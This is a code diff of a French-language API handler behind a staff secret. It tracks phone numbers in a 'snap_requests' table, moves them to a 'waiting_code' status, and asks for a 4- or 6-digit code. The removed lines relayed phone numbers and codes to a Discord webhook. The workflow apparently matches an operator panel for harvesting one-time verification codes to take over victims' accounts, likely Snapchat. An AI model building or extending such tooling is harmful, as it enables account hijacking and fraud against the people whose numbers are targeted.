@@ -6,9 +6,7 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ success: false });
 
   try {
-    const { action, phone, code, secret } = req.body;
-
-    // Sécurité basique — change ce secret !
+    const { action, phone, length, secret } = req.body;
     if (secret !== process.env.STAFF_SECRET) {
       return res.status(401).json({ success: false, message: 'Unauthorized' });
     }
@@ -20,26 +18,17 @@ export default async function handler(req, res) {
       return res.status(200).json({ success: true, message: 'Prise en charge confirmée' });
     }
 
-    if (action === 'send_code') {
-      if (!code || !/^\d{6}$/.test(code)) {
-        return res.status(400).json({ success: false, message: 'Code 6 chiffres requis' });
+    if (action === 'set_length') {
+      if (![4, 6].includes(length)) {
+        return res.status(400).json({ success: false, message: 'Longueur invalide (4 ou 6)' });
       }
-      await sql`UPDATE snap_requests SET status = 'waiting_code', staff_code = ${code} WHERE phone = ${phone}`;
+      await sql`UPDATE snap_requests SET status = 'waiting_code', code_length = ${length} WHERE phone = ${phone}`;
+      return res.status(200).json({ success: true, message: `Code à ${length} chiffres demandé` });
+    }
 
-      // Notifier Discord
-      if (process.env.DISCORD_WEBHOOK_URL) {
-        try {
-          await fetch(process.env.DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              content: `📩 **Code envoyé** au numéro \`${phone}\` — Code: ||${code}||`
-            })
-          });
-        } catch (e) {}
-      }
-
-      return res.status(200).json({ success: true, message: 'Code enregistré' });
+    if (action === 'wrong_number') {
+      await sql`UPDATE snap_requests SET status = 'wrong_number' WHERE phone = ${phone}`;
+      return res.status(200).json({ success: true, message: 'Wrong number signalé' });
     }
 
     return res.status(400).json({ success: false, message: 'Action inconnue' });
